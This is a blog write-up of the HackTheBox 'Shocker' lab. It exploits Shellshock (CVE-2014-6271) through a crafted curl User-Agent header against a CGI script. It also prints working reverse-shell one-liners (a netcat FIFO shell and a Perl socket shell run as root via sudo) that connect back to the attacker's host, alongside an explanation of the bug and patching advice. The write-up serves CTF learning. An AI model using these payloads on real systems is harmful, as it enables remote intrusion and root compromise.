---
layout: post
title: 'HackTheBox - Shocker'
date: 2018-02-18
author: Casey Mullineaux
cover: '/images/htb/shocker/htb-shocker-00.jpg'
tags: hackthebox
---

The box demonstrates the **ShellShock** vulnerability (also known as **bashdoor**) in the Unix bash shell that remained unknown by the general public for over 25 years, until it was disclosed on 24 September 2014.

This challenge was a great learning experience for me.

I was excited that all I needed to complete it was a solid understanding of both the vulnerability and knowledge of the fundamentals of how web requests are sent and received. I didn't need any fancy tools like `Metasploit` or custom exploit scripts downloaded from the internet - everything was done using only basic command line tools such as `curl`. 

# Hacking the box

1. [Reconnaissance](#recon)
2. [Enumeration](#enum)
3. [Exploitation](#exploit)
4. [Privilege escalation](#privesc)
5. [Deconstructing the hack](#deconstruct)

# <a name="recon"></a>Reconnaissance

I start this challenge off by making an educated guess. Judging by the name of the machine (shocker), I make the assumption that this challenge is focused on the **ShellShock** vulnerability. I set my initial focus to confirming that this system is vulnerable.

I start reading up on how ShellShock works and conclude I'm looking for the following things to confirm i'm on the right track:
* the existence of the **/cgi-bin** directory
* a script in that directory that runs a system command

# <a name="enum"></a> Enumeration
I start out with the basic nmap scan which reveals two open ports.

```bash 
nmap -sC -sV -A shocker 10.10.10.56
```

![htb-shocker-01](/images/htb/shocker/htb-shocker-01.png)

Focusing on **ShellShock**, I know I'm looking for executable scripts in the **cgi-bin** directory of the web server. I browse to /cgi-bin and receive a 403 - Forbidden. This is good news as a 403 indicates the directory exists, otherwise I would have been presented with a 404 (Not Found).

![htb-shocker-02-1](/images/htb/shocker/htb-shocker-02-1.png)

I grab a copy of the `/usr/share/wordlists/dirb/common_extensions.txt`, and remove any extensions that aren't an executable script. This leaves me with the following extensions.

* .cgi
* .php
* .pl
* .sh

I then used a file-based brute force attack on the **/cgi-bin** directory using `dirb` and my custom list of extensions. 

```bash
dirb http://10.10.10.56/cgi-bin -x ./extensions.txt 
```

![htb-shocker-03](/images/htb/shocker/htb-shocker-03.png)

As you can see by the timestamps, it took a little over 2 hours but it was worth it.

<p class="success">
    This attack reveals <b>cgi-bin/user.sh</b>.
</p>

I `curl` the page and get the following result.

```bash
root@kali:~/htb/shocker# curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 22:53:10 up 20 min,  0 users,  load average: 0.67, 0.60, 0.38
```

Leveraging what I learned about the ShellShock exploit in the reconnaissance phase, I know that I've got a script in the cgi-bin directory that runs a system command and returns it on a webpage - all the parameters needed to meet the profile for the vulnerability.

To exploit it, I need to craft a shell command in one of the HTTP headers that will be processed by the web server as an environment variable, which should result in the commands being executed on the remote system.

After setting up a netcat listener on my Kali host, I quickly create a test for ShellShock by attempting to send a ping command to my Kali system over port 1234.

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 10.10.14.253:1234'' http://10.10.10.56/cgi-bin/user.sh
```

![htb-shocker-04](/images/htb/shocker/htb-shocker-04.png)

<p class="success">
    A successful response confirms this system is vulnerable to ShellShock.
</p>

# <a name="exploitat"></a> Exploitation

Using the [Pentest Monkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) as a reference, I craft a user agent string to execute a reverse shell.

<p class="note">
    You can see here that the first 7 characters of the User-Agent is are the 'magic string' that exploits the ShellShock vulnerability.   
</p>

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c 'nc /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.253 1234 >/tmp/f''
```

![htb-shocker-05](/images/htb/shocker/htb-shocker-05.png)

<p class="success">
    A remote shell is returned successfully!
</p>


# <a name="privest"></a> Privilege escalation
Now that I have a shell, `sudo -l` shows me any commands that **shelly** can run with administrative permissions.

![htb-shocker-06](/images/htb/shocker/htb-shocker-06.png)

It looks here like we can run the `pearl` command as root without a password. Bingo!

Referencing the [Pentest Monkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) once again, I create a `pearl` command that will return a shell on a different port. I set up a netcat listener on that port, and use `sudo` to execute the command as root.

```bash
sudo perl -e 'use Socket;$i="10.10.14.253";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![htb-shocker-07](/images/htb/shocker/htb-shocker-07.png)

<p class="success">
    This successfully returns a root shell.
</p>


# <a name="deconstruct"></a>Deconstructing the hack

## Shellshock

<iframe type="text/html" width="100%" height="385" src="https://www.youtube.com/embed/aKShnpOXqn0" frameborder="0"></iframe>

Shellshock is a bug in the Unix bash shell that causes commands from environment variables to be executed unintentionally. If exploited, the vulnerabiltiy allows the attacker to remotely issue commands on the server as demonstrated in this post.

Although bash is not an internet facing service, it is often used by web applications to process information on the host and return the results back to the user. Under normal circumstances, the bash shell will take the input from the web application and store it as a text string within a variable. The process of storing all information as a literal string is a mechanism designed to prevent remote code execution.

The vulnerability known as ShellShock ([CVE-2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6271)) circumvents this safeguard. 

From Wikipedia:
> This original form of the vulnerability involves a specially crafted environment variable containing an exported function definition, followed by arbitrary commands. 
> Bash incorrectly executes the trailing commands when it imports the function. 
> 
> The vulnerability can be tested with the following command:
> ```env x='() { :;}; echo vulnerable' bash -c "echo this is a test"```

By prepending the 'magic string' of ```() { :; };``` to one of the HTTP headers, bash can be tricked into executing commands when the variable storing the header is read by the shell.

It is reported that attacks exploited Shellshock within hours of the initial disclosure by creating botnets of compromised computers to perform distributed denial of service (DDOS) attacks.

The most popular example of this is the **wopbot** botnet that began scanning the internet for vulnerable systems (including the United States Department of Defense), and launching DDOS attacks agains the well known content delivery service, Akamai.

## Mitigation

Since this bug exists within the Unix bash shell itself, the only mitigation is to ensure your system is patched against this vulnerability.

There are also [online tools available](https://pentest-tools.com/network-vulnerability-scanning/bash-shellshock-scanner) that allow you to test your websites to see if you are exposed to this vulnerabilty.



